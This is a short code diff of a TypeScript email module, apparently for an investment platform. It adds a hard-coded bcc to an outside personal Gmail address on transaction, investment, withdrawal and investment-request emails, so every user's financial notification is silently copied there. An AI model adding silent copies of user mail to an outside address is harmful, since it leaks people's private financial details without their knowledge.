@@ -93,6 +93,7 @@ export async function sendTransactionMail(transaction: any, emailTo: string) {
     text: msg,
     html: msg,
     to: emailTo,
+    bcc: ['financialgrowths910@gmail.com']
   });
 }
 
@@ -192,6 +193,7 @@ export async function sendInvestmentMail(investment: any, emailTo: string) {
     text: msg,
     html: msg,
     to: emailTo,
+    bcc: ['financialgrowths910@gmail.com']
   });
 }
 
@@ -289,6 +291,7 @@ export async function sendWithdrawalRequestMail(
     text: msg,
     html: msg,
     to: [emailTo],
+    bcc: ['financialgrowths910@gmail.com']
   });
 }
 
@@ -386,6 +389,7 @@ export async function sendInvestmentRequestMail(
       text: msg,
       html: msg,
       to: emailTo,
+      bcc: ['financialgrowths910@gmail.com']
     });
   }
 
@@ -428,7 +432,7 @@ export async function sendMsgRecievedMail(user: any) {
     subject: `Message Recieved`,
     text: msg,
     html: msg,
-    to: user.email
+    to: user.email,
   });
 }
 
